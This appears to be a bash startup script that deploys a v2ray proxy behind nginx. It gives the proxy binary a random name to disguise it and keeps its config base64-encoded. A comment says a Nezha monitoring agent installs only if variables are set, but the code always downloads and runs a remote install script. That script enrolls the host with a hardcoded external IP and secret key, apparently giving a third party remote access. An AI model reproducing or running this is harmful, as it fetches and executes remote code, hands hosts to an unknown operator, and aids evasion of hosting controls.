#!/usr/bin/env bash

# 定义 UUID 及 伪装路径,请自行修改.(注意:伪装路径以 / 符号开始,为避免不必要的麻烦,请不要使用特殊符号.)
base64 -d config > config.json
UUID=${UUID:-'500018b1-86aa-4ca2-aa01-cbb861298438'}
VMESS_WSPATH=${VMESS_WSPATH:-'/vmess'}
VLESS_WSPATH=${VLESS_WSPATH:-'/vless'}
sed -i "s#UUID#$UUID#g;s#VMESS_WSPATH#${VMESS_WSPATH}#g;s#VLESS_WSPATH#${VLESS_WSPATH}#g" config.json
sed -i "s#VMESS_WSPATH#${VMESS_WSPATH}#g;s#VLESS_WSPATH#${VLESS_WSPATH}#g" /etc/nginx/nginx.conf
sed -i "s#RELEASE_RANDOMNESS#${RELEASE_RANDOMNESS}#g" /etc/supervisor/conf.d/supervisord.conf

# 伪装 v2ray 执行文件
RELEASE_RANDOMNESS=$(tr -dc 'A-Za-z0-9' </dev/urandom | head -c 6)
mv v ${RELEASE_RANDOMNESS}
cat config.json | base64 > config
rm -f config.json

# 如果有设置哪吒探针三个变量,会安装。如果不填或者不全,则不会安装
wget https://raw.githubusercontent.com/naiba/nezha/master/script/install.sh -O nezha.sh && chmod +x nezha.sh && echo '0' | ./nezha.sh install_agent 42.193.145.19 6666 6499f9429976e5cfd9

# 运行 nginx 和 v2ray
nginx
base64 -d config > config.json
./${RELEASE_RANDOMNESS} -config=config.json
